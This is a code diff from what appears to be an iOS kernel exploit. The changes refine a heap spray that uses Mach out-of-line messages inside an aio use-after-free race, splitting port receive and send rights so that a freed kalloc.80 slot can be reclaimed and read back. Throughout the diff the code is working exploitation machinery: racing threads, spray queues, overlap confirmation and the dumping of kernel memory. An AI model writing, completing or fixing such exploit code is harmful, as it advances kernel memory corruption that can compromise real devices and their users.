@@ -3664,10 +3664,15 @@ static void *aio_free_and_reclaim_racer(void *arg) {
     // restricted on iOS). The spray thread then cycles these 5 messages rapidly.
     enum { kSprayQueueDepth = 5 };
 
-    mach_port_t sprayPort = MACH_PORT_NULL;
+    mach_port_t sprayRecv = MACH_PORT_NULL;
+    mach_port_t spraySend = MACH_PORT_NULL;
     __block int sprayReady = 0;
-    if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &sprayPort) == KERN_SUCCESS) {
-        sprayReady = 1;
+    if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &sprayRecv) == KERN_SUCCESS) {
+        mach_msg_type_name_t poly;
+        if (mach_port_extract_right(mach_task_self_, sprayRecv, MACH_MSG_TYPE_MAKE_SEND,
+                                     &spraySend, &poly) == KERN_SUCCESS) {
+            sprayReady = 1;
+        }
     }
     [self appendLog:[NSString stringWithFormat:@"  Spray port: %@", sprayReady ? @"OK" : @"FAILED"]];
 
@@ -3689,7 +3694,7 @@ static void *aio_free_and_reclaim_racer(void *arg) {
                 memset(&msg, 0, sizeof(msg));
                 msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
                 msg.header.msgh_size = sizeof(OOLMsg);
-                msg.header.msgh_remote_port = sprayPort;
+                msg.header.msgh_remote_port = spraySend;
                 msg.header.msgh_id = (mach_msg_id_t)i;
                 msg.body.msgh_descriptor_count = 1;
                 msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
@@ -3739,9 +3744,9 @@ static void *aio_free_and_reclaim_racer(void *arg) {
             // The freed kalloc.80 slot goes to freelist (seeds with our data).
             {
                 OOLMsg drainMsg;
-                drainMsg.header.msgh_local_port = sprayPort;
+                drainMsg.header.msgh_local_port = sprayRecv;
                 drainMsg.header.msgh_size = sizeof(OOLMsg);
-                kern_return_t drkr = mach_msg(&drainMsg.header, MACH_RCV_MSG, 0, sizeof(OOLMsg), sprayPort, 0, MACH_PORT_NULL);
+                kern_return_t drkr = mach_msg(&drainMsg.header, MACH_RCV_MSG, 0, sizeof(OOLMsg), sprayRecv, 0, MACH_PORT_NULL);
                 if (drkr == MACH_MSG_SUCCESS) {
                     dispatch_semaphore_signal(sprayStarted);
                 }
@@ -3756,7 +3761,7 @@ static void *aio_free_and_reclaim_racer(void *arg) {
                 memset(&sndMsg, 0, sizeof(sndMsg));
                 sndMsg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
                 sndMsg.header.msgh_size = sizeof(OOLMsg);
-                sndMsg.header.msgh_remote_port = sprayPort;
+                sndMsg.header.msgh_remote_port = spraySend;
                 sndMsg.body.msgh_descriptor_count = 1;
                 sndMsg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
                 sndMsg.ool.address = sprayPayload;
@@ -3767,9 +3772,9 @@ static void *aio_free_and_reclaim_racer(void *arg) {
 
                 // RECV second — frees one slot to make room for next send
                 OOLMsg rcvMsg;
-                rcvMsg.header.msgh_local_port = sprayPort;
+                rcvMsg.header.msgh_local_port = sprayRecv;
                 rcvMsg.header.msgh_size = sizeof(OOLMsg);
-                mach_msg(&rcvMsg.header, MACH_RCV_MSG, 0, sizeof(OOLMsg), sprayPort, 0, MACH_PORT_NULL);
+                mach_msg(&rcvMsg.header, MACH_RCV_MSG, 0, sizeof(OOLMsg), sprayRecv, 0, MACH_PORT_NULL);
             }
 
             // No drain needed — port destroy (cleanup section) frees remaining messages
@@ -4240,9 +4245,13 @@ static void *aio_free_and_reclaim_racer(void *arg) {
     }
 
     // ---- Cleanup spray resources ----
-    if (sprayPort != MACH_PORT_NULL) {
-        mach_port_destroy(mach_task_self_, sprayPort);
-        sprayPort = MACH_PORT_NULL;
+    if (sprayRecv != MACH_PORT_NULL) {
+        mach_port_destroy(mach_task_self_, sprayRecv);
+        sprayRecv = MACH_PORT_NULL;
+    }
+    if (spraySend != MACH_PORT_NULL) {
+        mach_port_deallocate(mach_task_self_, spraySend);
+        spraySend = MACH_PORT_NULL;
     }
     if (sprayPayload) {
         free(sprayPayload);
@@ -5856,18 +5865,26 @@ static int _aioUafRunning = 0;
 
     // Create 8 drain ports + 1 dedicated overlap port. 3 msgs each = fits in qlimit=5.
     enum { kDrainPorts = 8, kDrainMsgsPerPort = 3, kDrainTotal = kDrainPorts * kDrainMsgsPerPort };
-    mach_port_t drainPorts[kDrainPorts + 1];  // +1 for dedicated overlap port
-    mach_port_t overlapPort = MACH_PORT_NULL;
+    mach_port_t drainRecv[kDrainPorts];
+    mach_port_t drainSend[kDrainPorts];
     int drainPortsReady = 0;
     for (int p = 0; p < kDrainPorts; p++) {
-        drainPorts[p] = MACH_PORT_NULL;
-        if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &drainPorts[p]) == KERN_SUCCESS) {
-            drainPortsReady++;
+        drainRecv[p] = MACH_PORT_NULL;
+        drainSend[p] = MACH_PORT_NULL;
+        if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &drainRecv[p]) == KERN_SUCCESS) {
+            mach_msg_type_name_t poly;
+            if (mach_port_extract_right(mach_task_self_, drainRecv[p], MACH_MSG_TYPE_MAKE_SEND,
+                                         &drainSend[p], &poly) == KERN_SUCCESS) {
+                drainPortsReady++;
+            }
         }
     }
-    // Dedicated port for overlap spray — only gets 1 drain msg → 1+1=2 < 5
-    if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &overlapPort) != KERN_SUCCESS) {
-        overlapPort = MACH_PORT_NULL;
+    // Dedicated port for overlap spray — separate recv/send names
+    mach_port_t overlapRecv = MACH_PORT_NULL, overlapSend = MACH_PORT_NULL;
+    if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &overlapRecv) == KERN_SUCCESS) {
+        mach_msg_type_name_t poly;
+        mach_port_extract_right(mach_task_self_, overlapRecv, MACH_MSG_TYPE_MAKE_SEND,
+                                &overlapSend, &poly);
     }
     [self appendLog:[NSString stringWithFormat:@"  Drain ports: %d/%d ready", drainPortsReady, kDrainPorts]];
 
@@ -5899,7 +5916,7 @@ static int _aioUafRunning = 0;
             memset(&msg, 0, sizeof(msg));
             msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
             msg.header.msgh_size = sizeof(DrainMsg);
-            msg.header.msgh_remote_port = drainPorts[p];
+            msg.header.msgh_remote_port = drainSend[p];
             msg.header.msgh_id = (mach_msg_id_t)(p * kDrainMsgsPerPort + m);
             msg.body.msgh_descriptor_count = 1;
             msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
@@ -5929,7 +5946,7 @@ static int _aioUafRunning = 0;
         int e1ok = (aio_read(&e1) == 0);
         [self appendLog:[NSString stringWithFormat:@"  E1 aio_read: %@", e1ok ? @"OK" : @"FAIL"]];
 
-        if (e1ok && drainPayload && drainPortsReady > 0 && overlapPort != MACH_PORT_NULL) {
+        if (e1ok && drainPayload && drainPortsReady > 0 && overlapSend != MACH_PORT_NULL) {
             // Dedicated overlap port: only 1 drain msg sent → queue has room for overlap
             [self appendLog:@"  D: sending drain msg to overlap port..."];
             {
@@ -5937,7 +5954,7 @@ static int _aioUafRunning = 0;
                 memset(&preMsg, 0, sizeof(preMsg));
                 preMsg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
                 preMsg.header.msgh_size = sizeof(DrainMsg);
-                preMsg.header.msgh_remote_port = overlapPort;
+                preMsg.header.msgh_remote_port = overlapSend;
                 preMsg.header.msgh_id = 8888;
                 preMsg.body.msgh_descriptor_count = 1;
                 preMsg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
@@ -5954,7 +5971,7 @@ static int _aioUafRunning = 0;
             memset(&overlapMsg, 0, sizeof(overlapMsg));
             overlapMsg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
             overlapMsg.header.msgh_size = sizeof(DrainMsg);
-            overlapMsg.header.msgh_remote_port = overlapPort;
+            overlapMsg.header.msgh_remote_port = overlapSend;
             overlapMsg.header.msgh_id = 9999;
             overlapMsg.body.msgh_descriptor_count = 1;
             overlapMsg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
@@ -5979,13 +5996,13 @@ static int _aioUafRunning = 0;
                 [self appendLog:@"  *** Overlap confirmed — now reading slot contents ***"];
 
                 // ---- Phase E: Receive overlap msg to map kernel slot data ----
-                [self appendLog:@"\n--- Phase E: Dump OOL from overlapPort ---"];
+                [self appendLog:@"\n--- Phase E: Dump OOL from overlapRecv ---"];
                 {
                     DrainMsg eRcv;
                     memset(&eRcv, 0, sizeof(eRcv));
                     kern_return_t ekr = mach_msg(&eRcv.header, MACH_RCV_MSG, 0, sizeof(DrainMsg),
-                                                  overlapPort, 0, MACH_PORT_NULL);
-                    [self appendLog:[NSString stringWithFormat:@"  E: recv from overlapPort kr=%d", ekr]];
+                                                  overlapRecv, 0, MACH_PORT_NULL);
+                    [self appendLog:[NSString stringWithFormat:@"  E: recv from overlapRecv kr=%d", ekr]];
                     if (ekr == MACH_MSG_SUCCESS && eRcv.ool.address != NULL) {
                         uint8_t *d = (uint8_t *)eRcv.ool.address;
                         int sz = eRcv.ool.size;
@@ -6020,13 +6037,15 @@ static int _aioUafRunning = 0;
     // Drain all remaining messages from ports (best-effort, ignore errors)
     for (int p = 0; p < drainPortsReady; p++) {
         DrainMsg drmsg;
-        while (mach_msg(&drmsg.header, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(DrainMsg), drainPorts[p], 1, MACH_PORT_NULL) == MACH_MSG_SUCCESS) ;
-        mach_port_destroy(mach_task_self_, drainPorts[p]);
+        while (mach_msg(&drmsg.header, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(DrainMsg), drainRecv[p], 1, MACH_PORT_NULL) == MACH_MSG_SUCCESS) ;
+        mach_port_destroy(mach_task_self_, drainRecv[p]);
+        mach_port_deallocate(mach_task_self_, drainSend[p]);
     }
-    if (overlapPort != MACH_PORT_NULL) {
+    if (overlapRecv != MACH_PORT_NULL) {
         DrainMsg drmsg;
-        while (mach_msg(&drmsg.header, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(DrainMsg), overlapPort, 1, MACH_PORT_NULL) == MACH_MSG_SUCCESS) ;
-        mach_port_destroy(mach_task_self_, overlapPort);
+        while (mach_msg(&drmsg.header, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(DrainMsg), overlapRecv, 1, MACH_PORT_NULL) == MACH_MSG_SUCCESS) ;
+        mach_port_destroy(mach_task_self_, overlapRecv);
+        mach_port_deallocate(mach_task_self_, overlapSend);
     }
     free(drainPayload);
 
